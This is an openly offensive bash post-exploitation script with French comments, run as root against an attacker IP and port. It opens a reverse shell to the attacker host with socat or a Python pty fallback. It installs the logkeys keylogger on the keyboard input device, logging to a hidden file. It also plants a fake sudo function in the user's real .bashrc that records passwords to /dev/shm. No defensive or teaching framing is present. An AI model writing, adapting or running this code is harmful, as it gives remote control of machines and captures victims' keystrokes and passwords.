#!/bin/bash
# Usage : sudo bash b.sh <ip_attaquant> <port>
[ "$(id -u)" -eq 0 ] || { echo "lance avec sudo"; exit 1; }

export TERM=xterm-256color
H="$1"
P="$2"
D=/dev/shm
KL=$D/.kl
HF=$D/.h
LOG=/tmp/.cb.log

U="${SUDO_USER:-$USER}"
UHOME=$(getent passwd "$U" | cut -d: -f6)

install -o "$U" -g "$U" -m 666 /dev/null "$KL"
install -o "$U" -g "$U" -m 666 /dev/null "$HF"
: > "$LOG"

# --- 1. callback vers l'attaquant ---
if [ -z "$H" ] || [ -z "$P" ]; then
  echo "[!] arguments manquants : sudo bash b.sh <ip> <port>"
else
  if timeout 3 bash -c "echo > /dev/tcp/$H/$P" 2>/dev/null; then
    echo "[+] $H:$P joignable"
  else
    echo "[!] $H:$P INJOIGNABLE : verifie IP, listener et pare-feu"
    echo "[!] seconde tentative dans 5 s"
    sleep 5
  fi

  if command -v socat >/dev/null; then
    setsid socat "EXEC:bash -li,pty,stderr,setsid,sigint,sane" \
      "TCP:$H:$P,connect-timeout=5" >>"$LOG" 2>&1 &
  else
    setsid python3 -c 'import pty,socket,os,sys
s=socket.socket(); s.settimeout(5)
try: s.connect((sys.argv[1],int(sys.argv[2])))
except Exception as e: sys.exit(str(e))
for f in (0,1,2): os.dup2(s.fileno(),f)
pty.spawn("/bin/bash")' "$H" "$P" >>"$LOG" 2>&1 &
  fi

  sleep 1
  if pgrep -f 'socat.*EXEC|pty.spawn' >/dev/null; then
    echo "[+] callback lance -> $LOG"
  else
    echo "[!] callback mort, details :"
    cat "$LOG"
  fi
fi

# --- 2. keylogger evdev ---
command -v logkeys >/dev/null || apt-get install -y logkeys >/dev/null 2>&1
DEV=$(grep -E 'Handlers|EV=' /proc/bus/input/devices | grep -B1 'EV=120013' | grep -o 'event[0-9]*' | head -1)
if command -v logkeys >/dev/null && [ -n "$DEV" ]; then
  logkeys -k 2>/dev/null
  if logkeys -s -d "/dev/input/$DEV" -o "$KL" --no-timestamps 2>/dev/null; then
    echo "[+] keylogger : /dev/input/$DEV -> $KL"
  else
    echo "[!] logkeys a echoue sur $DEV"
  fi
else
  echo "[!] logkeys absent ou device introuvable"
fi

# --- 3. hook sudo dans le .bashrc reel ---
HOOK='sudo() { read -rsp "[sudo] password for $USER: " P; echo; echo "SUDO:$USER:$P" >> /dev/shm/.h; command sudo -S "$@" <<<"$P"; }'
if ! grep -q 'SUDO:$USER' "$UHOME/.bashrc" 2>/dev/null; then
  printf '%s\n' "$HOOK" >> "$UHOME/.bashrc"
  chown "$U:$U" "$UHOME/.bashrc"
  echo "[+] hook sudo -> $HF"
fi

# --- 4. shell local sur le terminal ---
exec bash -li
